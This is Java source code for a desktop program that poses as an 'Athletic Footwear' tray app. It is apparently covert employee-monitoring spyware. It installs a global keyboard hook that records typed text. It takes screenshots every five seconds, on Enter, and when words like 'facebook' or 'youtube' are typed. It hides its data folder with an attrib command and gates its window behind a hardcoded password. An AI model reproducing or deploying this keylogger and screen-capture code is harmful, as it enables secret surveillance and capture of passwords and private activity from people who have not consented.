/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package key;

import Modelo.ObjUsuario;
import Persistencia.Conexion;
import Persistencia.ConexionServer;
import java.awt.AWTException;
import java.awt.HeadlessException;
import java.awt.SystemTray;
import java.awt.TrayIcon;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.sql.Connection;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.swing.ImageIcon;
import javax.swing.JOptionPane;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author GATEWAY1-
 */
public class tray extends javax.swing.JFrame implements NativeKeyListener {

    ArrayList<String> listaword = new ArrayList<>();
    private String tecla = "";
    private String teclas = "";
    private String id = "";
    String fechadir = "";
    int cont = 0;
    private ImageIcon image;
    private TrayIcon Ticon;
    private SystemTray ttray;
    private boolean proceso = true;
    Connection con;
    ObjUsuario ou = new ObjUsuario();

    /**
     * Creates new form tray
     */
    public tray() {
        super("Athletic Footwear");
        try {
            image = new ImageIcon(this.getClass().getResource("over.png"));
            initComponents();
            this.setIconImage(image.getImage());
            this.setLocationRelativeTo(null);
            //Iniciar tray
            Ticon = new TrayIcon(image.getImage(), "aver clikeale", pop);
            Ticon.setImageAutoSize(true);
            ttray = SystemTray.getSystemTray();
            // iniciar native hook
            GlobalScreen.registerNativeHook();
            iniciodirectorios();
            cargalista();
            //autocapture();
        } catch (NativeHookException ex) {
            Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
        }
        GlobalScreen.getInstance().addNativeKeyListener(this);
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        pop = new java.awt.PopupMenu();
        menuItem1 = new java.awt.MenuItem();
        jButton1 = new javax.swing.JButton();
        jButton2 = new javax.swing.JButton();
        Lid = new javax.swing.JLabel();
        Cliente = new javax.swing.JRadioButton();
        jButton3 = new javax.swing.JButton();
        jLabel1 = new javax.swing.JLabel();

        pop.setLabel("popupMenu1");
        pop.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                popActionPerformed(evt);
            }
        });

        menuItem1.setLabel("menuItem1");
        menuItem1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                menuItem1ActionPerformed(evt);
            }
        });
        pop.add(menuItem1);

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setAlwaysOnTop(true);

        jButton1.setText("Minimizar");
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });

        jButton2.setText("jButton2");
        jButton2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton2ActionPerformed(evt);
            }
        });

        Cliente.setText("Server");
        Cliente.addItemListener(new java.awt.event.ItemListener() {
            public void itemStateChanged(java.awt.event.ItemEvent evt) {
                ClienteItemStateChanged(evt);
            }
        });

        jButton3.setText("jButton3");
        jButton3.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton3ActionPerformed(evt);
            }
        });

        jLabel1.setText("Tipo de servicio");

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(jLabel1)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 504, Short.MAX_VALUE)
                        .addComponent(Lid, javax.swing.GroupLayout.PREFERRED_SIZE, 45, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(Cliente)
                            .addComponent(jButton3))
                        .addGap(0, 0, Short.MAX_VALUE)))
                .addContainerGap())
            .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(jButton1)
                    .addComponent(jButton2))
                .addGap(0, 0, Short.MAX_VALUE))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addGap(26, 26, 26)
                        .addComponent(jLabel1))
                    .addGroup(layout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(Lid, javax.swing.GroupLayout.PREFERRED_SIZE, 24, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(Cliente)
                .addGap(57, 57, 57)
                .addComponent(jButton3)
                .addGap(86, 86, 86)
                .addComponent(jButton2)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 88, Short.MAX_VALUE)
                .addComponent(jButton1)
                .addContainerGap())
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void popActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_popActionPerformed

    }//GEN-LAST:event_popActionPerformed

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
        trayiconon();
        this.setVisible(false);
    }//GEN-LAST:event_jButton1ActionPerformed

    private void menuItem1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_menuItem1ActionPerformed

        String cadena = JOptionPane.showInputDialog(null, "Ingrese Contraseña :", DISPOSE_ON_CLOSE);
        if (cadena.equals("Mich")) {
            ttray.remove(Ticon);
            this.setVisible(true);
            if (proceso == false) {
                proceso = true;
                autocapture();
            }
        }
    }//GEN-LAST:event_menuItem1ActionPerformed

    private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton2ActionPerformed
//        try {
//            proceso = false;
//            Process p = Runtime.getRuntime().exec("c:\\windows\\af\\plugin\\ffmpeg -i c:\\windows\\a_%d.jpg -r 30 c:\\SAP\\peli.wmv");
//        } catch (IOException ex) {
//            System.out.println(ex);
//            Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
//        }
    }//GEN-LAST:event_jButton2ActionPerformed

    private void ClienteItemStateChanged(java.awt.event.ItemEvent evt) {//GEN-FIRST:event_ClienteItemStateChanged
        FileWriter fichero = null;
        try {
            File dire = new File("c:\\Win\\af\\a.dat");
            fichero = new FileWriter(dire);
            PrintWriter pw = new PrintWriter(fichero);
            pw.println("i:" + id + ",tipo:" + (Cliente.isSelected() ? "S" : "C"));
            fichero.close();
        } catch (IOException ex) {
            Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
        } finally {
            try {
                fichero.close();
            } catch (IOException ex) {
                Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }//GEN-LAST:event_ClienteItemStateChanged

    private void jButton3ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton3ActionPerformed
        connect();
    }//GEN-LAST:event_jButton3ActionPerformed

    public void connect() {
        try {
            Conexion c = new Conexion();
            con = c.getconexionC();
            ConexionServer cs = new ConexionServer();
            cs.getconexionS();
        } catch (ClassNotFoundException ex) {
            Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IOException ex) {
            Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
        } catch (SQLException ex) {
            Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    private void trayiconon() {
        try {
            if (SystemTray.isSupported()) {
                ttray.add(Ticon);
                // this.setVisible(false);
            }
        } catch (Exception e) {
        }
    }

    private void screencapture(String n) {
        try {
            //iniciar robot
            autocaptura a = new autocaptura();
            a.captura(n, fechadir, id);
        } catch (AWTException ex) {
            Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IOException ex) {
            Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    private void iniciodirectorios() {
        File root = new File("c:\\Win\\af");
        String fecha = fechaactual();
        if (root.exists()) {
            try {
                File dirf = new File("c:\\Win\\af\\data\\" + fecha);
                if (!dirf.exists()) {
                    dirf.mkdir();
                }
                fechadir = fecha;
                camposfile();
                Lid.setText("-" + id + "-");
            } catch (FileNotFoundException ex) {
                Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
            } catch (IOException ex) {
                Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
            }

        } else {
            try {
                String arr[] = {"c:\\Win", "c:\\Win\\af", "c:\\Win\\af\\plugin", "c:\\Win\\af\\data",
                    "c:\\Win\\af\\extra", "c:\\Win\\af\\data\\" + fecha};
                for (int i = 0; i < arr.length; i++) {
                    File dir = new File(arr[i]);
                    dir.mkdir();
                }
                id = JOptionPane.showInputDialog(null, "ingrese numero usuario");
                boolean resp;
                do {
                    resp = ou.checkuser(Integer.parseInt(id));//busqueda de usuario existente en servidor principal
                } while (resp);
                Runtime.getRuntime().exec("attrib -s -r +h c:\\Win");
                File dire = new File("c:\\Win\\af\\a.dat");
                FileWriter fichero = new FileWriter(dire);
                PrintWriter pw = new PrintWriter(fichero);
                pw.println("i:" + id + ",tipo:" + (Cliente.isSelected() ? "C" : "S"));
                fichero.close();
            } catch (HeadlessException | IOException ex) {
                Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
            }
        }

    }

    private void camposfile() throws FileNotFoundException, IOException {
        File idread = new File("c:\\Win\\af\\a.dat");
        FileReader fr = null;
        BufferedReader br = null;
        fr = new FileReader(idread);
        br = new BufferedReader(fr);
        String var;
        String var2 = "";
        int conta = 0;
        String arr[] = new String[2];
        while ((var = br.readLine()) != null) {
            String aux = "-";
            for (int z = 0; z < var.length(); z++) {
                var2 += var.charAt(z);
                if (var2.equals("i") || var2.equals("tipo")) {
                    z++;
                    aux = "";
                    if (var.charAt(z) == ',' || var.charAt(z) == ':') {
                        if (verificaexpresion(aux) && !aux.equals("")) {
                            arr[0] = aux;
                        }
                        aux = "";
                        var2 = "";
                    } else {
                        aux += var.charAt(z);
                    }
                } else {
                    if (var.charAt(z) == ',' || var.charAt(z) == ':') {
                        if (verificaexpresion(aux)) {
                            arr[conta] = aux;
                            conta++;
                        }
                        aux = "";
                        var2 = "";
                    } else {
                        aux += var.charAt(z);
                    }
                }
            }
            id = arr[0];
            if (aux.equals("S")) {
                Cliente.setSelected(true);
                trayiconon();
            } else {
                Cliente.setSelected(false);
                trayiconon();
            }
        }
    }

    private void cargalista() {
        listaword.add("face");
        listaword.add("Face");
        listaword.add("facebook");
        listaword.add("fa");
        listaword.add("you");
        listaword.add("youtube");
        listaword.add("You");
        listaword.add("face");

    }

    private boolean filtraword(String word) {
        boolean resp = false;
        for (int i = 0; i < listaword.size(); i++) {
            if (listaword.get(i).equals(word)) {
                resp = true;
                i = listaword.size();
            }
        }
        return resp;
    }

    private String fechaactual() {
        Calendar fecha = Calendar.getInstance();
        int año = fecha.get(Calendar.YEAR);
        String mes = String.valueOf(fecha.get(Calendar.MONTH) + 1);
        String dia = String.valueOf(fecha.get(Calendar.DAY_OF_MONTH));
        if (dia.length() == 1) {
            dia = "0" + dia;
        }
        if (mes.length() == 1) {
            mes = "0" + mes;
        }
        return dia + "-" + mes + "-" + año;
    }

    public boolean verificaexpresion(String cad) {
        boolean resp = false;
        String patt = "[0-9A-Za-z]*";
        Pattern pat = Pattern.compile(patt);
        Matcher match = pat.matcher(cad);
        if (match.matches()) {
            resp = true;
        }
        return resp;
    }

    private void autocapture() {
        Thread t = new Thread() {
            @Override
            public void run() {
                try {
                    while (proceso) {
                        screencapture(String.valueOf(cont));
                        Thread.sleep(5000);
                        cont++;
                    }
                } catch (InterruptedException ex) {
                    Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        };
        t.start();
    }

    private void manualcapture() {
        screencapture(String.valueOf(cont));
        cont++;
    }

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(tray.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(tray.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(tray.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(tray.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new tray().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JRadioButton Cliente;
    private javax.swing.JLabel Lid;
    private javax.swing.JButton jButton1;
    private javax.swing.JButton jButton2;
    private javax.swing.JButton jButton3;
    private javax.swing.JLabel jLabel1;
    private java.awt.MenuItem menuItem1;
    private java.awt.PopupMenu pop;
    // End of variables declaration//GEN-END:variables

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
//        //System.out.println(teclas.length()+"-"+teclas+"-");
//        if (nke.getRawCode() == 13 && !teclas.equals("") && teclas.length() != 0) {
//            System.out.println("aver que token es? " + tecla);
//            System.out.println("salte linea una nueva: " + teclas);
//            manualcapture();
//            teclas = "";
//            tecla = "";
//        } else if (nke.getRawCode() == 32) {
//            System.out.println("aver que token es? " + tecla);
//            System.out.println("-" + tecla + "-" + filtraword(tecla));
//            if (filtraword(tecla)) {
//                System.out.println("tas viendo algo que no prro >:V ");
//                manualcapture();
//            }
//            tecla = "";
//        }
//        if (nke.getRawCode() == 13 || nke.getRawCode() == 32) {
//            teclas += nke.getKeyChar();
//        } else {
//            tecla += nke.getKeyChar();
//        }
//        if (nke.getKeyCode() == NativeKeyEvent.VK_F1) {
//            System.out.println("control");
//        }
////        System.out.println(nke.getRawCode());
//        //System.out.print(nke.getKeyChar());
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
        //System.out.println(teclas.length()+"-"+teclas+"-");
        if (nke.getRawCode() == 13 && !teclas.equals("") && teclas.length() != 0) {
            teclas += tecla;
            //System.out.println("aver que token es? " + tecla);
            System.out.println("salte linea una nueva: " + teclas);
            manualcapture();
            teclas = "";
            tecla = "";
        } else if (nke.getRawCode() == 32) {
            System.out.println("aver que token es? " + tecla);
            //System.out.println("-" + tecla + "-" + filtraword(tecla));
            if (filtraword(tecla)) {
                System.out.println("tas viendo algo que no prro >:V ");
                manualcapture();
            }
            teclas += tecla;
            tecla = "";
        }
        if (nke.getRawCode() == 13 || nke.getRawCode() == 32) {
            teclas += nke.getKeyChar();
        } else {
            tecla += nke.getKeyChar();
        }
        //System.out.println(tecla+" * "+teclas);
        if (nke.getKeyCode() == NativeKeyEvent.VK_F1) {
            System.out.println("control");
        }
        //System.out.println(nke.getRawCode());
        //System.out.print(nke.getKeyChar());
    }

}
